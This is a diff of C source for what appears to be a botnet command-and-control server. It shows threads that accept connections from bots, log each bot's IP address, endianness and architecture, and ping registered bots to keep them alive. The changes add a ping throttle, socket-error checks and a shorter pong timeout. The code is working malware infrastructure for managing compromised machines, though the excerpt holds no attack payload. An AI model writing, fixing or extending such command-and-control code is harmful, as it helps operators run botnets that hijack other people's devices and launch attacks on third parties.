@@ -6,11 +6,12 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdbool.h>
-#include <netinet/tcp.h> //for keepalive etc
-#include <errno.h> //eeeeeee
-
+#include <netinet/tcp.h>
+#include <errno.h>
+#include <sys/time.h>
+//file replaced
 Bot bots[MAX_BOTS];
-int bot_count = 0; //best method for anti dup?
+int bot_count = 0;
 int global_cooldown = 0;
 pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -99,7 +100,6 @@ void* bot_listener(void* arg) {
     bot_server_addr.sin_family = AF_INET;
     bot_server_addr.sin_addr.s_addr = INADDR_ANY;
     bot_server_addr.sin_port = htons(botport);
-    //add this
     if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
         close(bot_server_socket);
         return NULL;
@@ -118,7 +118,7 @@ void* bot_listener(void* arg) {
             free(bot_socket);
             continue;
         }
-        // and this
+
         setsockopt(*bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
         setsockopt(*bot_socket, SOL_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
         setsockopt(*bot_socket, SOL_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
@@ -187,7 +187,7 @@ void* bot_listener(void* arg) {
                             inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));
                             const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
                             char logarch[128];
-                            char* arch = archbuf + 5;  // Skip "pong " prefix
+                            char* arch = archbuf + 5;
                             snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture: %s", endian, arch);
                             log_bot_join(logarch, ipbuf);
                             bot_count++;
@@ -215,14 +215,32 @@ void* bot_listener(void* arg) {
 
 void* ping_bots(void* arg) {
     char pongbuf[64];
+    struct timeval last_ping = {0};
+    
     while (1) {
+        struct timeval now;
+        gettimeofday(&now, NULL);
+        
+        if (now.tv_sec - last_ping.tv_sec < 15) {
+            usleep(100000);
+            continue;
+        }
+        
         pthread_mutex_lock(&bot_mutex);
         int current_pos = 0;
         
         for (int i = 0; i < bot_count; i++) {
             if (!bots[i].is_valid) continue;
             
-            int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL);
+            int error = 0;
+            socklen_t len = sizeof(error);
+            if (getsockopt(bots[i].socket, SOL_SOCKET, SO_ERROR, &error, &len) < 0 || error != 0) {
+                close(bots[i].socket);
+                bots[i].is_valid = 0;
+                continue;
+            }
+            
+            int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL | MSG_DONTWAIT);
             if (res < 0) {
                 if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
                     if (current_pos != i) {
@@ -240,7 +258,7 @@ void* ping_bots(void* arg) {
             struct timeval tv;
             FD_ZERO(&readfds);
             FD_SET(bots[i].socket, &readfds);
-            tv.tv_sec = 10;
+            tv.tv_sec = 2;
             tv.tv_usec = 0;
             memset(pongbuf, 0, sizeof(pongbuf));
             
